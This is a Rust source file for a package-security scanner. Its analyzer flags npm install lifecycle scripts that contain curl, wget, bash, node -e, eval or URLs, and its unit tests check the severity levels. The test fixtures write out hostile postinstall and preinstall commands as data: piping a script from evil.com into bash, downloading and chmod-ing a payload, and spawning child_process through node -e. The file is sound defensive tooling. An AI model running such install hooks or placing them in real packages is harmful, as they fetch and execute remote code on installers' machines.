use std::path::PathBuf;
use std::sync::OnceLock;

use regex::Regex;

use crate::types::{AnalysisContext, Finding, FindingCategory, Severity};

use super::{truncate, Analyzer};

/// Scripts in package.json that run during install lifecycle.
/// "prepare" is excluded — it runs on `npm publish` and `git install`, not on `npm install`.
const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "postinstall", "preuninstall"];

/// Common development-only scripts that are safe and expected.
const SAFE_SCRIPT_VALUES: &[&str] = &[
    "husky",
    "husky install",
    "lint-staged",
    "patch-package",
    "ngcc",
    "prebuild-install",
    "node-gyp rebuild",
    "tsc",
    "tsc --build",
];

fn re_dangerous_cmd() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"(?:curl|wget|bash|sh\s+-c|node\s+-e|eval\s|https?://)"#).unwrap()
    })
}

fn re_node_file() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"node\s+([^\s;&|]+\.(?:js|cjs|mjs))"#).unwrap())
}

/// Analyzes package.json install scripts for suspicious patterns.
pub struct InstallScriptAnalyzer;

impl Analyzer for InstallScriptAnalyzer {
    fn name(&self) -> &str {
        "install-scripts"
    }

    fn analyze(&self, ctx: &AnalysisContext) -> Vec<Finding> {
        let files = ctx.files;
        let package_json = ctx.package_json;
        let mut findings = Vec::new();

        let scripts = match package_json.get("scripts").and_then(|v| v.as_object()) {
            Some(s) => s,
            None => return findings,
        };

        let dangerous = re_dangerous_cmd();

        for &script_name in LIFECYCLE_SCRIPTS {
            let script_value = match scripts.get(script_name).and_then(|v| v.as_str()) {
                Some(s) => s,
                None => continue,
            };

            // Skip known safe/development scripts
            let trimmed_value = script_value.trim();
            if SAFE_SCRIPT_VALUES
                .iter()
                .any(|s| trimmed_value.eq_ignore_ascii_case(s))
            {
                continue;
            }

            // CRITICAL: script contains dangerous commands / URLs
            if dangerous.is_match(script_value) {
                findings.push(Finding {
                    severity: Severity::Critical,
                    category: FindingCategory::InstallScript,
                    title: format!("Dangerous command in \"{}\" script", script_name),
                    description: format!(
                        "The \"{}\" script contains a potentially dangerous command (curl, wget, bash, node -e, eval, or a URL)",
                        script_name
                    ),
                    file: Some("package.json".to_string()),
                    line: None,
                    snippet: Some(truncate(script_value, 100)),
                });
            } else {
                // MEDIUM (not HIGH): install script present but not obviously dangerous
                findings.push(Finding {
                    severity: Severity::Medium,
                    category: FindingCategory::InstallScript,
                    title: format!("Install lifecycle script \"{}\" present", script_name),
                    description: format!(
                        "The package defines a \"{}\" script. Review its contents.",
                        script_name
                    ),
                    file: Some("package.json".to_string()),
                    line: None,
                    snippet: Some(truncate(script_value, 100)),
                });
            }

            // MEDIUM: script references a JS file that doesn't exist in the package
            check_missing_script_file(script_value, files, script_name, &mut findings);
        }

        findings
    }
}

/// If the install script runs a JS file (e.g. `node install.js`), check that
/// the file actually exists in the package.
fn check_missing_script_file(
    script_value: &str,
    files: &[(PathBuf, String)],
    script_name: &str,
    findings: &mut Vec<Finding>,
) {
    let re = re_node_file();

    if let Some(caps) = re.captures(script_value) {
        let target = &caps[1];
        let target_path = PathBuf::from(target);

        let exists = files
            .iter()
            .any(|(p, _)| p == &target_path || p.ends_with(&target_path));

        if !exists {
            findings.push(Finding {
                severity: Severity::Medium,
                category: FindingCategory::InstallScript,
                title: format!(
                    "\"{}\" script references missing file: {}",
                    script_name, target
                ),
                description: format!(
                    "The script runs \"{}\" but this file was not found in the package",
                    target
                ),
                file: Some("package.json".to_string()),
                line: None,
                snippet: Some(truncate(script_value, 100)),
            });
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    use crate::analyzers::Analyzer;
    use crate::registry::package::PackageMetadata;
    use crate::types::{FindingCategory, Severity};

    fn default_metadata() -> PackageMetadata {
        PackageMetadata {
            name: Some("test-pkg".into()),
            description: None,
            versions: std::collections::HashMap::new(),
            time: std::collections::HashMap::new(),
            maintainers: None,
            dist_tags: None,
            extra: std::collections::HashMap::new(),
        }
    }

    fn analyze_pkg(package_json: serde_json::Value) -> Vec<Finding> {
        let analyzer = InstallScriptAnalyzer;
        let files: Vec<(PathBuf, String)> = vec![];
        let metadata = default_metadata();
        let tmp = Path::new("/tmp");
        let ctx = AnalysisContext {
            name: "test-pkg",
            version: "1.0.0",
            files: &files,
            package_json: &package_json,
            metadata: &metadata,
            package_dir: tmp,
        };
        analyzer.analyze(&ctx)
    }

    #[test]
    fn flags_postinstall_curl_bash() {
        let pkg = serde_json::json!({
            "scripts": {
                "postinstall": "curl http://evil.com/setup.sh | bash"
            }
        });
        let findings = analyze_pkg(pkg);
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .collect();
        assert!(
            !critical.is_empty(),
            "should flag postinstall with curl|bash as CRITICAL, got: {:?}",
            findings
        );
        assert!(critical[0].category == FindingCategory::InstallScript);
    }

    #[test]
    fn flags_postinstall_wget() {
        let pkg = serde_json::json!({
            "scripts": {
                "postinstall": "wget http://evil.com/payload -O /tmp/p && chmod +x /tmp/p"
            }
        });
        let findings = analyze_pkg(pkg);
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .collect();
        assert!(
            !critical.is_empty(),
            "should flag postinstall with wget as CRITICAL, got: {:?}",
            findings
        );
    }

    #[test]
    fn flags_preinstall_node_e() {
        let pkg = serde_json::json!({
            "scripts": {
                "preinstall": "node -e \"require('child_process').exec('whoami')\""
            }
        });
        let findings = analyze_pkg(pkg);
        let critical: Vec<_> = findings
            .iter()
            .filter(|f| f.severity == Severity::Critical)
            .collect();
        assert!(
            !critical.is_empty(),
            "should flag preinstall with node -e as CRITICAL, got: {:?}",
            findings
        );
    }

    #[test]
    fn skips_safe_scripts() {
        for safe in &["husky install", "patch-package", "node-gyp rebuild"] {
            let pkg = serde_json::json!({
                "scripts": {
                    "postinstall": safe
                }
            });
            let findings = analyze_pkg(pkg);
            assert!(
                findings.is_empty(),
                "should skip safe script '{}', but got: {:?}",
                safe,
                findings
            );
        }
    }

    #[test]
    fn no_scripts_no_findings() {
        let pkg = serde_json::json!({
            "name": "safe-package",
            "version": "1.0.0"
        });
        let findings = analyze_pkg(pkg);
        assert!(findings.is_empty(), "no scripts should produce no findings");
    }

    #[test]
    fn empty_script_value_no_crash() {
        let pkg = serde_json::json!({
            "scripts": {
                "postinstall": ""
            }
        });
        // Should not panic; empty string is not dangerous so it gets a Medium finding
        let findings = analyze_pkg(pkg);
        // Just verify it didn't crash -- the empty script gets a Medium "present" finding
        assert!(
            findings.iter().all(|f| f.severity != Severity::Critical),
            "empty script should not be CRITICAL"
        );
    }
}
